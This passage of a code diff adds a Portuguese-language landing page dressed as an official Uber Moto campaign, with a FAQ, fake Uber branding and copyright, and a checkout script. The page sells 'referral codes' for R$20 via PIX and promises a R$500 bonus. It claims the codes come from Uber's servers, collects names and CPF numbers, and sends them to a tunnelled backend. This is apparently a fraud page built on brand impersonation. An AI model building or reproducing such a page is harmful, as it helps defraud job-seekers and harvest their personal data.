+                                    <div class="tutorial-num">2</div>
+                                    <div>Inicie seu cadastro escolhendo a categoria <strong>Uber Moto</strong>.</div>
+                                </li>
+                                <li>
+                                    <div class="tutorial-num">3</div>
+                                    <div>No campo <strong>"Código de indicação"</strong>, cole o código copiado acima.</div>
+                                </li>
+                                <li>
+                                    <div class="tutorial-num">4</div>
+                                    <div>Envie seus documentos. Assim que aprovado, complete as 30 primeiras corridas e receba os <strong>R$ 500,00</strong> na sua conta bancária cadastrada.</div>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <!-- AJUDA / PROBLEMAS WHATSAPP -->
+                        <div style="margin-top: 18px; padding: 14px; background: #f0fdf4; border: 1px solid #bbf7d0; border-radius: 12px; text-align: center;">
+                            <div style="font-size: 13px; font-weight: 700; color: #166534; margin-bottom: 8px;">
+                                Dúvidas ou qualquer problema com o código?
+                            </div>
+                            <a href="https://wa.me/5522997201054?text=Ol%C3%A1%2C%20comprei%20o%20c%C3%B3digo%20Uber%20Moto%20e%20preciso%20de%20ajuda%2Fsuporte" target="_blank" rel="noopener noreferrer" style="display: inline-flex; align-items: center; gap: 8px; background: #25d366; color: #fff; font-size: 13px; font-weight: 800; padding: 8px 18px; border-radius: 20px; text-decoration: none;">
+                                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12.031 6.172c-3.181 0-5.767 2.586-5.768 5.766-.001 1.298.38 2.27 1.019 3.287l-.582 2.128 2.182-.573c.978.58 1.911.928 3.145.929 3.178 0 5.767-2.587 5.768-5.766.001-3.187-2.575-5.77-5.764-5.771zm3.392 8.244c-.144.405-.837.774-1.17.824-.312.045-.693.08-2.227-.552-1.745-.719-2.846-2.48-2.934-2.597-.086-.118-.707-.939-.707-1.791 0-.853.447-1.272.607-1.446.16-.174.348-.217.464-.217.116 0 .232.002.333.007.106.005.249-.04.39.298.144.347.491 1.2.535 1.287.043.087.072.188.014.303-.058.116-.087.188-.173.289l-.26.304c-.087.086-.177.18-.076.354.101.174.449.741.964 1.201.662.591 1.221.774 1.394.86.174.086.275.072.376-.044.101-.116.433-.506.549-.68.116-.174.231-.145.39-.087s1.011.477 1.184.564c.174.087.289.13.332.202.043.073.043.419-.101.824z"/></svg>
+                                <span>Falar no WhatsApp (22) 99720-1054</span>
+                            </a>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+
+            <!-- COLUNA DIREITA: FOTO DESKTOP OFICIAL UBER MOTO -->
+            <div class="hero-right">
+                <div class="photo-card-wrap">
+                    <img src="/assets/uber_moto_pro.png" alt="Motorista parceiro Uber Moto" class="uber-main-photo">
+                    <div class="photo-caption-tag">
+                        <div>
+                            <div class="photo-caption-title">Uber Moto Parceiro</div>
+                            <div class="photo-caption-sub">Campanha Oficial de Novos Cadastros</div>
+                        </div>
+                        <div class="badge-verified-uber">
+                            Oficial
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- 4. COMO FUNCIONA O BÔNUS (3 PASSOS RÁPIDOS) -->
+    <section class="steps-section">
+        <div class="steps-container">
+            <div class="section-header">
+                <h2>Como Funciona o Bônus de R$ 500</h2>
+                <p>Passo a passo simples para garantir seu incentivo financeiro oficial.</p>
+            </div>
+
+            <div class="steps-grid">
+                <div class="step-box">
+                    <div class="step-circle">1</div>
+                    <div class="step-title">Adquira seu Código</div>
+                    <div class="step-desc">
+                        Pague a taxa única de R$ 20,00 via PIX processado com total segurança pela BsPay. O código é exibido na hora na sua tela.
+                    </div>
+                </div>
+
+                <div class="step-box">
+                    <div class="step-circle">2</div>
+                    <div class="step-title">Ative no App Uber Driver</div>
+                    <div class="step-desc">
+                        Inicie seu primeiro cadastro como parceiro Uber Moto e cole o código no campo de indicação durante a criação da conta.
+                    </div>
+                </div>
+
+                <div class="step-box">
+                    <div class="step-circle">3</div>
+                    <div class="step-title">Faça 30 Viagens & Receba</div>
+                    <div class="step-desc">
+                        Complete suas primeiras 30 corridas de moto. O bônus oficial de R$ 500,00 é depositado diretamente na sua conta bancária.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 5. PERGUNTAS FREQUENTES (FAQ) -->
+    <section class="faq-section">
+        <div class="faq-container">
+            <div class="section-header" style="margin-bottom: 32px;">
+                <h2>Dúvidas Frequentes</h2>
+                <p>Tire suas dúvidas antes de adquirir seu código de indicação.</p>
+            </div>
+
+            <div class="faq-item">
+                <div class="faq-question">
+                    <span>Quem tem direito ao bônus de R$ 500?</span>
+                </div>
+                <div class="faq-answer">
+                    Qualquer novo motorista ou entregador parceiro que esteja criando sua primeira conta na Uber na categoria Moto e completar 30 viagens concluídas.
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <div class="faq-question">
+                    <span>Funciona para quem já tem conta de motorista na Uber?</span>
+                </div>
+                <div class="faq-answer">
+                    Não. Conforme as regras da campanha, a promoção é exclusiva para novos cadastros (primeiro registro como motorista ou entregador parceiro).
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <div class="faq-question">
+                    <span>Como e quando recebo meu código?</span>
+                </div>
+                <div class="faq-answer">
+                    A entrega é 100% imediata e automática! Assim que você realizar o pagamento do PIX de R$ 20,00, a tela atualiza na mesma hora exibindo seu código exclusivo para copiar.
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <div class="faq-question">
+                    <span>O código tem garantia de funcionamento?</span>
+                </div>
+                <div class="faq-answer">
+                    Sim! Nossos códigos são gerados diretamente nos servidores oficiais da Uber, válidos e prontos para ativação imediata no aplicativo Uber Driver.
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <div class="faq-question">
+                    <span>Dúvidas ou problemas com o código?</span>
+                </div>
+                <div class="faq-answer">
+                    Nosso suporte está à disposição no WhatsApp <strong>(22) 99720-1054</strong> para auxiliar em qualquer dúvida ou dificuldade na ativação.
+                    <div style="margin-top: 10px;">
+                        <a href="https://wa.me/5522997201054?text=Ol%C3%A1%2C%20preciso%20de%20ajuda%20com%20o%20c%C3%B3digo%20Uber%20Moto" target="_blank" rel="noopener noreferrer" style="color: #25d366; font-weight: 700; text-decoration: none; display: inline-flex; align-items: center; gap: 6px;">
+                            <span>Falar agora com o Suporte</span> →
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 6. FOOTER LIMPO -->
+    <footer class="uber-footer">
+        <div class="footer-container">
+            <div class="footer-top">
+                <div class="footer-logo">Uber</div>
+                <div style="font-size: 13px; color: var(--uber-white); font-weight: 600;">
+                    Campanha de Indicação Uber Moto Brasil • Suporte: (22) 99720-1054
+                </div>
+            </div>
+
+            <div class="footer-disclaimer">
+                *Campanha promocional de indicação válida exclusivamente para novos parceiros cadastrados na categoria Uber Moto que completarem o requisito de 30 viagens. O bônus de R$ 500,00 é processado e repassado pela plataforma Uber. A taxa de emissão do código de R$ 20,00 é intermediada com segurança pelo gateway de pagamentos BsPay.
+            </div>
+
+            <div class="footer-bottom">
+                <div>© 2026 Uber Technologies Inc. Todos os direitos reservados.</div>
+                <div>Pagamentos processados via BsPay</div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- 7. BOTÃO FLUTUANTE WHATSAPP (APENAS ÍCONE CIRCULAR) -->
+    <a href="https://wa.me/5522997201054?text=Ol%C3%A1%2C%20preciso%20de%20ajuda%20ou%20suporte%20com%20o%20c%C3%B3digo%20Uber%20Moto" target="_blank" rel="noopener noreferrer" class="floating-whatsapp-btn" id="btn-floating-whatsapp" title="Falar no WhatsApp (22) 99720-1054">
+        <svg viewBox="0 0 24 24" fill="#ffffff">
+            <path d="M12.031 6.172c-3.181 0-5.767 2.586-5.768 5.766-.001 1.298.38 2.27 1.019 3.287l-.582 2.128 2.182-.573c.978.58 1.911.928 3.145.929 3.178 0 5.767-2.587 5.768-5.766.001-3.187-2.575-5.77-5.764-5.771zm3.392 8.244c-.144.405-.837.774-1.17.824-.312.045-.693.08-2.227-.552-1.745-.719-2.846-2.48-2.934-2.597-.086-.118-.707-.939-.707-1.791 0-.853.447-1.272.607-1.446.16-.174.348-.217.464-.217.116 0 .232.002.333.007.106.005.249-.04.39.298.144.347.491 1.2.535 1.287.043.087.072.188.014.303-.058.116-.087.188-.173.289l-.26.304c-.087.086-.177.18-.076.354.101.174.449.741.964 1.201.662.591 1.221.774 1.394.86.174.086.275.072.376-.044.101-.116.433-.506.549-.68.116-.174.231-.145.39-.087s1.011.477 1.184.564c.174.087.289.13.332.202.043.073.043.419-.101.824z"/>
+        </svg>
+    </a>
+
+    <!-- SCRIPTS DE FUNCIONAMENTO (CHECKOUT BSPAY + POLLING + CONFETTI) -->
+    <script>
+        const API_BASE = (!window.location.hostname.includes('netlify.app'))
+            ? ''
+            : 'https://announcements-essence-champagne-receiving.trycloudflare.com';
+
+        let currentOrderId = null;
+        let checkStatusInterval = null;
+
+        // Máscara de CPF
+        document.getElementById('input-cpf').addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\D/g, '');
+            if (v.length > 11) v = v.slice(0, 11);
+            if (v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
+            else if (v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
+            else if (v.length > 3) v = v.replace(/(\d{3})(\d{1,3})/, '$1.$2');
+            e.target.value = v;
+        });
+
+        // Checkout Real BsPay
+        async function realizarCheckout(e) {
+            e.preventDefault();
+            const btn = document.getElementById('btn-submit-order');
+            btn.disabled = true;
+            btn.innerHTML = '<span>Gerando cobrança PIX BsPay...</span>';
+
+            const nome = document.getElementById('input-nome').value.trim();
+            const contato = document.getElementById('input-contato').value.trim();
+            const cpf = document.getElementById('input-cpf').value.trim();
+
+            try {
+                const res = await fetch(API_BASE + '/api/checkout', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ nome, contato, cpf })
+                });
+
+                const data = await res.json();
+                if (!res.ok || data.error) {
+                    alert('Aviso: ' + (data.error || 'Erro ao gerar PIX'));
+                    btn.disabled = false;
+                    btn.innerHTML = '<span>PAGAR VIA PIX (R$ 20,00) & LIBERAR CÓDIGO</span>';
+                    return;
+                }
+
+                currentOrderId = data.order_id;
+                exibirTelaPix(data);
+            } catch (err) {
+                alert('Erro de conexão: ' + err.message);
+                btn.disabled = false;
+                btn.innerHTML = '<span>PAGAR VIA PIX (R$ 20,00) & LIBERAR CÓDIGO</span>';
+            }
+        }
+
+        // Exibir tela PIX com QR Code
+        function exibirTelaPix(data) {
+            document.getElementById('checkout-form-area').style.display = 'none';
+            document.getElementById('pix-area').style.display = 'block';
+
+            document.getElementById('pix-copia-cola-text').innerText = data.pix_copia_cola;
+
+            // Renderiza QR Code instantâneo com QRCodeJS
+            const qrWrap = document.getElementById('qrcode-canvas-wrap');
+            qrWrap.innerHTML = '';
+            try {
+                new QRCode(qrWrap, {
+                    text: data.pix_copia_cola,
+                    width: 200,
+                    height: 200,
+                    colorDark: "#000000",
+                    colorLight: "#ffffff",
+                    correctLevel: QRCode.CorrectLevel.M
+                });
+            } catch (e) {
+                const encodedPix = encodeURIComponent(data.pix_copia_cola);
+                qrWrap.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?data=${encodedPix}&size=200x200" alt="QR Code PIX">`;
+            }
+
+            // Inicia verificação do status na BsPay a cada 2.5 segundos
+            if (checkStatusInterval) clearInterval(checkStatusInterval);
+            checkStatusInterval = setInterval(verificarStatusPedido, 2500);
+        }
+
+        // Consulta status na BsPay
+        async function verificarStatusPedido() {
+            if (!currentOrderId) return;
+            try {
+                const res = await fetch(API_BASE + `/api/pedido/${currentOrderId}`);
+                const data = await res.json();
+
+                if (data.status === 'PAID') {
+                    clearInterval(checkStatusInterval);
+                    exibirTelaSucesso(data.codigo_entregue);
+                }
+            } catch (e) {
+                console.warn('Status poll:', e);
+            }
+        }
+
+        // Copiar PIX
+        function copiarPixCopiaCola() {
+            const txt = document.getElementById('pix-copia-cola-text').innerText;
+            navigator.clipboard.writeText(txt).then(() => {
+                const btn = event.target.closest('button');
+                const oldHtml = btn.innerHTML;
+                btn.innerHTML = '<span>PIX COPIADO COM SUCESSO!</span>';
+                btn.style.backgroundColor = '#06c167';
+                setTimeout(() => { 
+                    btn.innerHTML = oldHtml; 
+                    btn.style.backgroundColor = ''; 
+                }, 2000);
+            });
+        }
+
+        // Exibir Sucesso e Código
+        function exibirTelaSucesso(codigo) {
+            document.getElementById('pix-area').style.display = 'none';
+            document.getElementById('success-area').style.display = 'block';
+            document.getElementById('codigo-gerado').innerText = codigo || 'ERRO_AO_OBTER';
+
+            try {
+                confetti({
+                    particleCount: 140,
+                    spread: 80,
+                    origin: { y: 0.55 },
+                    colors: ['#000000', '#06c167', '#ffffff']
+                });
+            } catch (e) {}
+        }
+
+        function copiarCodigoEntregue() {
+            const code = document.getElementById('codigo-gerado').innerText;
+            navigator.clipboard.writeText(code).then(() => {
+                const btn = event.target.closest('button');
+                const oldHtml = btn.innerHTML;
+                btn.innerHTML = '<span>CÓDIGO COPIADO!</span>';
+                btn.style.backgroundColor = '#000000';
+                setTimeout(() => {
+                    btn.innerHTML = oldHtml;
+                    btn.style.backgroundColor = '';
+                }, 2500);
+            });
+        }
+
+        // Atualizar estoque dinâmico
+        async function carregarOferta() {
+            try {
+                const res = await fetch(API_BASE + '/api/oferta');
+                const data = await res.json();
+                if (data.estoque_disponivel !== undefined) {
+                    document.getElementById('estoque-count').innerText = data.estoque_disponivel.toLocaleString('pt-BR');
+                }
+            } catch (e) {}
+        }
+        carregarOferta();
+    </script>
+</body>
+</html>
